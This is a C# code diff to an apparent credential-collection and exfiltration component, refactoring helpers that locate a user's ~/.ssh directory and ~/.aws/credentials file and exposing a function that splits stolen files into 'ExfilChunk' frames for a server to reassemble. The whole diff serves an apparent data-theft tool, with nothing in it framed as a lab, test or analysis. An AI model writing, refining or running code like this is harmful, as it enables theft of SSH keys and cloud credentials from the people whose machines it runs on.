@@ -125,7 +125,7 @@ internal static class Collect
     // Slices a byte buffer into ExfilChunk frames of ChunkSize, stamping a
     // terminal flag on the last chunk so the server reassembles and flushes
     // the artifact. Sequence numbers start at 1.
-    private static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
+    internal static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
     {
         if (data.Length == 0)
         {
@@ -319,15 +319,30 @@ internal static class Collect
     }
 
     private static string SshDir()
-    {
-        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-        return Path.Combine(home, ".ssh");
-    }
+        => Path.Combine(HomeDir(), ".ssh");
 
     private static string AwsCredentialsPath()
+        => Path.Combine(HomeDir(), ".aws", "credentials");
+
+    // Resolves the current user's home directory. On Linux/macOS $HOME is
+    // authoritative (matching os.UserHomeDir in the wire-protocol contract and
+    // standard Unix tooling); on Windows %USERPROFILE% is. Falls back to
+    // Environment.GetFolderPath when the variable is unset.
+    private static string HomeDir()
     {
-        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-        return Path.Combine(home, ".aws", "credentials");
+        if (OperatingSystem.IsWindows())
+        {
+            var profile = Environment.GetEnvironmentVariable("USERPROFILE");
+            if (!string.IsNullOrEmpty(profile))
+                return profile;
+        }
+        else
+        {
+            var home = Environment.GetEnvironmentVariable("HOME");
+            if (!string.IsNullOrEmpty(home))
+                return home;
+        }
+        return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
     }
 
     // Runs a platform command, capturing combined stdout/stderr. A non-zero
